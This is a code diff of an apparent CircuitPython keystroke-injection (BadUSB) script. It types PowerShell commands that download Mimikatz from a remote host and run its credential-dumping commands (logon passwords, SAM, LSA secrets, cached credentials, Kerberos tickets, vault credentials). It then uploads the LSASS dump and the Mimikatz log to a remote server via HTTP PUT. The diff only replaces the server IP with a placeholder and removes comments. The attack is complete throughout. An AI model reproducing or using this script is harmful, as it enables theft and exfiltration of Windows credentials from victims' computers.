@@ -54,7 +54,7 @@ keyboard.release_all()
 time.sleep(2)
 
 # Download Mimikatz as shell.exe
-layout.write('Invoke-WebRequest -Uri http://192.168.1.42:8000/mimikatz.exe -OutFile $shell')
+layout.write('Invoke-WebRequest -Uri http://IP:Port/mimikatz.exe -OutFile $shell')
 keyboard.press(Keycode.ENTER)
 keyboard.release_all()
 time.sleep(2)
@@ -73,79 +73,77 @@ time.sleep(2)
 
 # 🔥 Now typing into Mimikatz 🔥
 
-# COMMAND 1: privilege::debug
+
 layout.write('privilege::debug')
 keyboard.press(Keycode.ENTER)
 keyboard.release_all()
 time.sleep(2)
 
-# COMMAND 2: token::elevate
+
 layout.write('token::elevate')
 keyboard.press(Keycode.ENTER)
 keyboard.release_all()
 time.sleep(2)
 
-# COMMAND 3: sekurlsa::minidump lsass.dmp
 layout.write('sekurlsa::minidump C:\\temp\\lsass.dmp')
 keyboard.press(Keycode.ENTER)
 keyboard.release_all()
 time.sleep(2)
 
-# COMMAND 4: sekurlsa::logonpasswords
+
 layout.write('sekurlsa::logonpasswords')
 keyboard.press(Keycode.ENTER)
 keyboard.release_all()
 time.sleep(2)
 
-# COMMAND 5: lsadump::sam
+
 layout.write('lsadump::sam')
 keyboard.press(Keycode.ENTER)
 keyboard.release_all()
 time.sleep(2)
 
-# COMMAND 6: lsadump::secrets
+
 layout.write('lsadump::secrets')
 keyboard.press(Keycode.ENTER)
 keyboard.release_all()
 time.sleep(2)
 
-# COMMAND 7: lsadump::cache
+
 layout.write('lsadump::cache')
 keyboard.press(Keycode.ENTER)
 keyboard.release_all()
 time.sleep(2)
 
-# COMMAND 8: sekurlsa::tickets
+
 layout.write('sekurlsa::tickets')
 keyboard.press(Keycode.ENTER)
 keyboard.release_all()
 time.sleep(2)
 
-# COMMANDE 13 : kerberos::list
 layout.write('kerberos::list')
 keyboard.press(Keycode.ENTER)
 keyboard.release_all()
 time.sleep(2)
 
-# COMMANDE 14 : kerberos::tickets
+
 layout.write('kerberos::tickets')
 keyboard.press(Keycode.ENTER)
 keyboard.release_all()
 time.sleep(2)
 
-# COMMAND 9: sekurlsa::ekeys
+
 layout.write('sekurlsa::ekeys')
 keyboard.press(Keycode.ENTER)
 keyboard.release_all()
 time.sleep(2)
 
-# COMMAND 10: vault::list
+
 layout.write('vault::list')
 keyboard.press(Keycode.ENTER)
 keyboard.release_all()
 time.sleep(2)
 
-# COMMAND 11: vault::cred
+
 layout.write('vault::cred')
 keyboard.press(Keycode.ENTER)
 keyboard.release_all()
@@ -158,7 +156,7 @@ keyboard.press(Keycode.ENTER)
 keyboard.release_all()
 time.sleep(2)
 
-# COMMAND 12: exit
+
 layout.write('exit')
 keyboard.press(Keycode.ENTER)
 keyboard.release_all()
@@ -167,13 +165,13 @@ time.sleep(2)
 # 🔥 Now both lsass.dmp and mimikatz_log.txt are ready 🔥
 
 # Upload lsass.dmp to server via PUT
-layout.write('Invoke-WebRequest -Uri http://192.168.1.42:8080/lsass.dmp -Method PUT -InFile "C:\\temp\\lsass.dmp"')
+layout.write('Invoke-WebRequest -Uri http://IP:Port/lsass.dmp -Method PUT -InFile "C:\\temp\\lsass.dmp"')
 keyboard.press(Keycode.ENTER)
 keyboard.release_all()
 time.sleep(2)
 
 # Upload mimikatz_log.txt to server via PUT
-layout.write('Invoke-WebRequest -Uri http://192.168.1.42:8080/mimikatz_log.txt -Method PUT -InFile "C:\\temp\\mimikatz_log.txt"')
+layout.write('Invoke-WebRequest -Uri http://IP:Port/mimikatz_log.txt -Method PUT -InFile "C:\\temp\\mimikatz_log.txt"')
 keyboard.press(Keycode.ENTER)
 keyboard.release_all()
 time.sleep(2)
